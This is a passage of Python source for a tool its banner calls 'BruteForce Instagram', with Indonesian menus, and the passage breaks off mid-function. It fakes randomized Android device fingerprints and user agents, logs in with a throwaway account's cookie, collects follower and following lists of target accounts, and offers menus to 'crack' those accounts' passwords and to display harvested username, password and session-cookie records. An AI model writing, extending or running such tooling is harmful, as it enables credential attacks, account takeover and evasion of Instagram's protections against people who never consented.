A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005']
        self.oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
        self.oppo2 = ["OP4F97", "OP4BA5L1", "OP664D1", "OP5F11L1", "OP2A92", "OP8F17", "OP8F31", "OP4C9E1", "OP5B31", "OP4BA6L1", "OP2B87", "OP6F21", "OP6C8E1", "OP8F11", "OPPOA16", "OPPOA15", "OPPOA11", "OPPOA73", "OPPOA37", "OPPOA53", "OPPOA33", "OPPOA93", "OPPOA35", "OPPOA83", "OPPOA57", "OPPOA71", "OPPOA39", "OPPOA3", "OPPOA51", "OPPOA27", "OPPOA79"]
        self.poco = ['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G']
        self.dpi = str(random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi']))
        self.pxl = str(random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733']))
        self.mt_qcom = str(random.choice(["qcom","mt6769", "qcom", "mt6768", "qcom","mt6767", "qcom","mt6765", "qcom","mt6763", "qcom","mt6757", "qcom","mt6755", "qcom","mt6753", "qcom","mt6739", "qcom","mt6737", "qcom","mt6735", "qcom","mt6595", "qcom","mt6582", "qcom","mt6572", "mt6571", "qcom","mt6570", "qcom","mt8563", "qcom","mt8167", "qcom","mt8163", "mt8135", "qcom","mt8127", "qcom","mt8125", "qcom","mt7623", "qcom","mt6797", "qcom","mt6592", "qcom","mt6590", "qcom","mt6580", "qcom","mt6573", "qcom","mt6575", "qcom","mt6260", "qcom","mt6236"]))
        self.device_android = str(random.choice(["27/9","27/10","27/11","27/12","27/12","27/13","28/9","28/10","28/11","28/12","28/12","28/13","29/9","29/10","29/11","29/12","29/12","29/13","27/9","30/10","30/11","30/12","30/12","30/13","31/9","31/10","31/11","31/12","31/12","31/13","32/9","32/10","32/11","32/12","32/12","32/13","33/9","33/10","33/11","33/12","33/12","33/13"]))
        self.kode = str(random.choice(['145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186']))
        self.kode2 = (f'{random.randint(211111111,399999999)}')
        self.locale = str(random.choice((["id_ID","en_GB", "en_US", "ar_LY", "fr_FR", "es_ES", "de_DE", "it_IT", "pt_BR", "tr_TR","ru_RU","in_ID"])))
        #self.versi_istagram = random.choice(("70.0.0.15.98, 80.0.0.20.101,60.0.0.10.76, 85.0.0.25.100,75.0.0.22.99,72.0.0.18.94, 68.0.0.16.84,78.0.0.14.97, 63.0.0.20.81,81.0.0.24.105,73.0.0.16.96,67.0.0.18.88,84.0.0.21.110,74.0.0.18.100,71.0.0.15.92,79.0.0.14.103,62.0.0.18.80,87.0.0.22.115,76.0.0.20.102,83.0.0.18.10,66.0.0.16.87,88.0.0.24.118,77.0.0.22.103,64.0.0.18.82,82.0.0.20.107,69.0.0.14.92,89.0.0.20.123,61.0.0.14.76,86.0.0.18.112,65.0.0.12.86").split(","))
        self.versi_istagram = (f'{random.randint(299,399)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}')
        self.asus = ['ASUS_A002','ASUS_A002A','ASUS_A002_1','ASUS_A002_2','ASUS_AI2201','ASUS_AI2201_B','QTI SM8475','ASUS_I001_1','ASUS_I001D','ASUS_I002D','ASUS_I003_1','ASUS_I003D','ASUS_I004D','ASUS_I005_1','ASUS_I005D','ASUS_I006D','ASUS_I006D','ASUS_I007_1','ASUS_I007D','ASUS_I01WD','ASUS_Z01QD_1','ASUS_Z01QD']
        self.iphn = random.choice(["11,8", "12,1", "9,2", "13,3", "10,5", "12,8", "10,4", "13,1", "9,1", "11,2"])
        self.ios = random.choice(["iOS 14_4_1", "iOS 15_0", "iOS 12_1_3", "iOS 15_0_1", "iOS 14_7_1", "iOS 14_6", "iOS 13_5", "iOS 14_0_1", "iOS 11_2_6", "iOS 15_1"])
        self.scale = random.choice(["2.00", "3.00", "2.61", "2.00", "2.61", "2.00", "3.00", "2.00", "2.61", "3.00"])
        self.gamut = random.choice(["display", "P3", "display", "wide", "P3", "display", "wide"])
        return(random.choice([
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; asus; {str(random.choice(self.asus))}; {str(random.choice(self.asus))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; OPPO; {str(random.choice(self.oppo2))}; {str(random.choice(self.oppo))}; qcom; in_ID; {self.kode2})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; micromax; {str(random.choice(self.micromax))}; {str(random.choice(self.micromax))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oneplus; {str(random.choice(self.oneplus))}; {str(random.choice(self.oneplus))}; qcom; in_ID; {self.kode})',
            #   f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; VIVO; {str(random.choice(self.vivo2))}; {str(random.choice(self.vivo))}; qcom; in_ID; {self.kode2})',
              #f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; poco; {str(random.choice(self.poco))}; {str(random.choice(self.poco))}; qcom; in_ID; {self.kode})',
              # f"Barcelona {self.versi_istagram} (iPhone{self.iphn}; {self.ios}; in_ID; in_ID; scale={self.scale}; gamut={self.gamut}; {self.pxl}; {self.kode2})"  
       ]))
        
class InstagramAuthHelper:
    def __init__(self):
        self.machine_ids = {}
    
    def get_random_machine_id(self):
        return '' if not self.machine_ids else random.choice(self.machine_ids)
        
    def generate_android_id(self, username, password):
        hash_generator = hashlib.md5()
        hash_generator.update(username.encode('utf-8') + password.encode('utf-8'))
        hash_value = hash_generator.hexdigest()
        hash_generator.update(hash_value.encode('utf-8') + '12345'.encode('utf-8'))
        return hash_generator.hexdigest()
        
    def generate_device_id(self):
        return 'android-%s'%(self.generate_uuid(use_hex=True)[:16])

    def generate_uuid(self, use_hex=False, seed=None):
        if seed is not None:
           hash_generator = hashlib.md5()
           hash_generator.update(seed.encode('utf-8'))
           uuid_value = uuid.UUID(hash_generator.hexdigest())
        else:
           uuid_value = uuid.uuid4()
           if use_hex: return str(uuid_value.hex)
        return str(uuid_value)

    def generate_adid(self, username):
        hash_generator = hashlib.sha256()
        hash_generator.update(username.encode('utf-8'))
        hash_value = hash_generator.hexdigest()
        return self.generate_uuid(use_hex=False, seed=hash_value)

    def generate_guid(self):
        return self.generate_uuid(use_hex=False)

    def generate_poid(self):
        return self.generate_uuid(use_hex=False, seed=self.generate_guid())
        
    def get_random_block_id(self):
        block_ids = [
            'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965',
            'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
            '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf'
        ]
        return random.choice(block_ids)
    
    def get_timezone_offset(self):
        current_time = datetime.now(pytz.timezone('Asia/Jakarta'))
        offset_hours = current_time.utcoffset().total_seconds() / 3600
        return offset_hours
    
    def UseNet(self):
        return('MOBILE.LTE','MOBILE(LTE)')
    
def clear():
    os.system('cls' if os.name=='nt' else 'clear')

def banner():
    clear()
    logo = """[bold red]●[bold yellow] ●[bold green] ●[/]
    [bold red]______ __           ____  ______       ________             
    ___  //_/_____________  |/ /__(_)_________  __ \\_______   __
    __  ,<  _  _ \\_  __ \\_    /__  /__  __ \\_  / / /  _ \\_ | / /
    _  /| | /  __/  / / /    | _  / _  / / /  /_/ //  __/_ |/ / 
    [bold white]/_/ |_| \\___//_/ /_//_/|_| /_/  /_/ /_//_____/ \\___/_____/

        [underline red] BruteForce Instagram - Coded by KenXinDev[/]
"""
    KenXinDev(Panel(logo, width=80, style="bold bright_black"))

def KenXin_Input():
    return Console().input("[bold bright_black]   ╰─> ")

def KenXin_Error(message):
    KenXinDev(f'[bold bright_black]   ──> [bold red]{message}', end='\r')
    return None

def KenXin_Warning(message):
    KenXinDev(f'[bold bright_black]   ──> [bold yellow]{message}', end='\r')
    return None

class Instagram:
    def __init__(self):
        self.helper = InstagramAuthHelper()

    def headers(self):
        return {
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro Build/TP1A.221005.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 Instagram 257.1.0.16.110 Android (33/13; 560dpi; 1440x2906; Google/google; Pixel 6 Pro; raven; raven; en_US; 409942499)'
        }
    
    def check_cookie(self):
        try:
            cookie = json.loads(open('data/cookie.json', 'r').read())['cookie']
            data = self.verifikasi_cookie(cookie)
            data_login.update(data)
            self.MENU_VIEW()
        except FileNotFoundError:
            banner()
            KenXin_Error('Cookie invalid!!')
            sleep(3)
            self.input_cookie()
        except json.JSONDecodeError:
            os.remove('data/cookie.json')
            banner()
            KenXin_Error('Cookie invalid!!')
            sleep(3)
            self.input_cookie()
    
    def input_cookie(self):
        try:
            banner()
            KenXinDev(Panel("[bold white]Masukan cookie instagram anda, pastikan menggunakan akun tumbal jangan menggunakan akun pribadi[/]", subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [Login Cookies] <<", title_align='center'))
            cookie = KenXin_Input()
            if not cookie:
                KenXin_Error('Input cookie harus diisi!')
                sleep(3)
                self.input_cookie()
            else:
                data = self.verifikasi_cookie(cookie)
                data_login.update(data)
                open('data/cookie.json', 'w').write(json.dumps({'cookie': cookie}, indent=4, sort_keys=True))
                self.MENU_VIEW()
        except Exception as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            sleep(3)
            self.input_cookie()
    
    def verifikasi_cookie(self, cookie):
        try:
            ds_user_id = re.search('ds_user_id=(.*?);', cookie).group(1)
            response = requests.get("https://i.instagram.com/api/v1/users/{}/info/".format(ds_user_id), headers=self.headers(), cookies={'cookie': cookie}).json()
            if response['user']:
                return response['user']
            else:
                KenXin_Error('Cookie invalid!!')
                sleep(3)
                self.input_cookie()
        except Exception as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            sleep(3)
            self.input_cookie()
    
    def logo(self):
        username = data_login['username']
        banner()
        KenXinDev(Panel('[bold white]Selamat datang [bold green]{}[/bold green], silahkan pilih menu yang ingin anda lakukan[/]'.format(username), width=80, style='bold bright_black'))
        menu = """[bold white]01. Crack dari mengikuti                02. Crack dari pengikut
03. Dump unlimited                      04. Crack results cp
05. Check results crack                 00. Logout[/]"""
        KenXinDev(Panel(menu, subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [Menu Instagram] <<", title_align='center'))

    def MENU_VIEW(self):
        self.logo()
        choose = KenXin_Input()
        if choose == '0' or choose == '00':
            os.remove('data/cookie.json')
            KenXin_Error('Could not load cookie file!!')
            sleep(3)
            self.check_cookie()
        elif choose == '1' or choose == '01':
            self.crack_following()
        elif choose == '2' or choose == '02':
            self.crack_followers()
        elif choose == '3' or choose == '03':
            self.dump_unlimited()
        elif choose == '4' or choose == '04':
            self.crack_results_cp()
        elif choose == '5' or choose == '05':
            self.check_results_crack()
        else:
            KenXin_Error('Pilihan menu yang anda pilih salah!')
            sleep(3)
            self.MENU_VIEW()
    
    def check_results_crack(self):
        for i in os.listdir('results/'):
            line_info = len(open(f'results/{i}', 'r').read().splitlines())
            KenXinDev("[bold bright_black]   ──> [bold white]{} : [bold green]{}[/bold green] akun[/]".format(i, line_info))
        KenXinDev(Panel("[bold white]Masukan file results yang akan di check ulang dan jangan salah format username|password pada file results[/]",subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [File Input] <<", title_align='center'))
        try:
            file_input = KenXin_Input()
            if not os.path.isfile(f'results/{file_input}'):
                KenXin_Error('File input invalid!!')
                sleep(3)
                self.check_results_crack()
            file = open(f'results/{file_input}', 'r').read().splitlines()
            if 'checkpoint-' in file_input:
                print()
                for i in file:
                    username, password = i.split('|')
                    KenXinDev("[bold white]Status : [bold yellow]Checkpoint[/bold yellow]\nUsername : [bold yellow]{}[/bold yellow]\nPassword : [bold yellow]{}[/bold yellow][/]\n".format(username, password))
                    sleep(0.1)
            else:
                print()
                for i in file:
                    username, password, pengikut, mengikuti, postingan, cookie = i.split('|')
                    KenXinDev("[bold white]Status : [bold green]Success[/bold green]\nUsername : [bold green]{}[/bold green]\nPassword : [bold green]{}[/bold green]\nPengikut : [bold green]{}[/bold green]\nMengikuti : [bold green]{}[/bold green]\nPostingan : [bold green]{}[/bold green]\nCookie : [bold green]{}[/bold green][/]\n".format(username, password, pengikut, mengikuti, postingan, cookie))
                    sleep(0.1)
        except FileNotFoundError:
            KenXin_Error('File input invalid!!')
            sleep(3)
            self.check_results_crack()

    def crack_results_cp(self):
        for i in os.listdir('results/'):
            line_info = len(open(f'results/{i}', 'r').read().splitlines())
            KenXinDev("[bold bright_black]   ──> [bold white]{} : [bold green]{}[/bold green] akun[/]".format(i, line_info))
        KenXinDev(Panel("[bold white]Masukan file results yang akan di check ulang dan jangan salah format username|password pada file results[/]",subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [File Input] <<", title_align='center'))
        try:
            file_input = KenXin_Input()
            if not os.path.isfile(f'results/{file_input}'):
                KenXin_Error('File input invalid!!')
                sleep(3)
                self.crack_results_cp()
            file = open(f'results/{file_input}', 'r').read().splitlines()
            for i in file:
                username, password = i.split('|')
                self.validate_results(username, password, len(file))
            KenXinDev(Panel('[bold white]Crack ulang telah selesai dengan hasil ok dan cp : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(len(success), len(checkpoint)), width=80, style='bold bright_black', title='[bold bright_black]>> [Instagram Info] <<[/]'))
            sleep(3)
        except FileNotFoundError:
            KenXin_Error('File input invalid!!')
            sleep(3)
            self.crack_results_cp()
         
    def dump_unlimited(self):
        try:
            cookies = json.loads(open('data/cookie.json', 'r').read())
            KenXinDev(Panel('[bold white]Masukan username target, pastikan target tidak private atau centang biru. Gunakan tanda koma jika ingin dump massal[/]',subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [Username Input] <<", title_align='center'))
            username = KenXin_Input()
            if not username:
                KenXin_Error('Username target harus diisi!')
                sleep(3)
                self.dump_unlimited()
            for user in username.split(','):
                uid = self.getUserID(user, cookies)
            KenXinDev(Panel('[bold white]Masukan type dump apakah anda ingin dump [bold yellow]followers[/bold yellow]/[bold green]following[/bold green] ketik di keyboardmu',subtitle="[bold bright_black]╭──────", width=80, subtitle_align='left', style='bold bright_black', title="[bold bright_black]>> [Type Dump] <<", title_align='center'))
            type_dumps = KenXin_Input()
            if type_dumps.lower() not in ['followers', 'following']:
                KenXin_Error('Type dump harus [bold yellow]followers[/bold yellow]/[bold green]following[/bold green]!')
                sleep(3)
                self.dump_unlimited()
            else:
                try:self.curl_unlimited(uid, cookies, type_dumps, '')
                except Exception:pass
            if len(dumps) < 50:
                KenXin_Warning('Following terlalu sedikit!')
                sleep(3)
                self.dump_unlimited()
            else:
                self.settings()
        except Exception as e:
            KenXin_Error(f'Terjadi kesalahan: {str(e)}')
            sleep(3)
    
    def curl_unlimited(self, uid, cookies, type, cursor=''):
        while True:
